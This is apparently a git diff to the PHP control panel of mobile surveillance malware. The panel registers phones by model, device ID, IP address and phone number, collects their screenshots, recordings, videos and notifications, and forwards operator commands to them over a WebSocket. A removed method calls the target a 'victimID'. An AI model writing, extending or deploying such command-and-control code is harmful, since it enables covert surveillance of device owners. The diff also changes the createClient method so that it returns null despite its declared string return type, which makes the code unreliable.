@@ -15,11 +15,14 @@ use Server\Model\Notification;
 use Server\Model\Recording;
 use Server\Model\Screenshot;
 use Server\Model\Video;
+use WebSocket\Client as TextTalkWebSocket;
 
 use function Server\Library\render;
 
 class ControlPanel extends Base
 {
+    /** @var string $webSocketURI Web Socket URI */
+    private string $webSocketURI = "ws://localhost:8080";
 
     private WebSocketClient $socketClient;
 
@@ -173,19 +176,19 @@ class ControlPanel extends Base
     public function createClient(): string
     {
         if (!isset($_POST['phone']))
-            return;
+            return null;
 
         if (!isset($_POST['device_api']))
-            return;
+            return null;
 
         if (!isset($_POST['device_id']))
-            return;
+            return null;
 
         if (!isset($_POST['device_model']))
-            return;
+            return null;
 
         if (!isset($_POST['ip_address']))
-            return;
+            return null;
 
         $query = "INSERT INTO CLIENT(model, device_id, ip_address, device_api, phone) VALUES(?, ?, ?, ?, ?)";
         $data = [
@@ -225,6 +228,30 @@ class ControlPanel extends Base
             $file_tmp = $_FILES['file']['tmp_name'];
             
             move_uploaded_file($file_tmp, $destination . $file_name);
+        }
+    }
+
+    /**
+     * Send command to web socket server
+     */
+    public function sendCommand(): void
+    {
+        if (!isset($_POST['cmd']))
+            return;
+
+        $client = new TextTalkWebSocket($this->webSocketURI);
+
+        try {
+            // Connect to the WebSocket server
+            $client->connect();
+        
+            // Send a message
+            $client->send(json_encode($_POST));
+        
+            // Close the WebSocket connection
+            $client->close();
+        } catch (\Exception $e) {
+            echo "Error: " . $e->getMessage() . "\n";
         }
     }
 
@@ -466,18 +493,6 @@ class ControlPanel extends Base
         }
 
         return $videos;
-    }
-
-    private function sendCommand(int $cmd, int $victimID, int $webSocketID): void
-    {
-        $msg = [
-            "type" => "server",
-            "cmd" => $cmd,
-            "client_id" => $victimID,
-            "resource_id" => $webSocketID
-        ];
-
-        $this->socketClient->send($msg);
     }
 
     /**
